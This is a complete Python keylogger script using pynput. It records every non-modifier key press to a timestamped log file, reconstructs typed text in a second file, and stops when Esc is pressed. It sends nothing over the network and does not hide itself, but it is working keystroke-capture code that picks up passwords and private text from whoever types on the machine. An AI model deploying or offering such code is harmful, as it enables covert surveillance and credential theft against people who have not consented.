import pynput.keyboard
from pynput.keyboard import Key, Listener
import logging

log_dir = ""  # Set your desired log directory here
keys = []
count = 0

logging.basicConfig(filename=(log_dir + "keylogger.log"), level=logging.DEBUG, format="%(asctime)s : %(message)s")


# Define a list of keys to ignore (CapsLock, Shift, Ctrl, Alt, etc.)
IGNORE_KEYS = {Key.caps_lock, Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r}

def on_press(key):
    global count, keys

    # Skip logging ignored keys
    if key in IGNORE_KEYS:
        return
    
    keys.append(key)
    # Log key to log file
    logging.info(str(key))
    write_to_file()
        


def write_to_file():
    with open(log_dir + "keylogger.txt", "a") as file:
        for key in keys:
            key_str = str(key).replace("'", "")
            # Handle special keys
            if key == Key.space:
                file.write(" ")
            elif key == Key.enter:
                file.write("\n")
            elif key == Key.backspace:
                # Handle backspace (removing the last character from the file)
                file.seek(file.tell() - 1, 0)
                file.truncate()
            else:
                # Write other keys (removing "Key." prefix for special keys)
                file.write(key_str if not key_str.startswith('Key.') else f'[{key_str}]')

        keys.clear()  # Clear the buffer after writing


def on_release(key):
    if key == Key.esc:
        # Exit listener on pressing 'esc'
        return False


# Starting the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
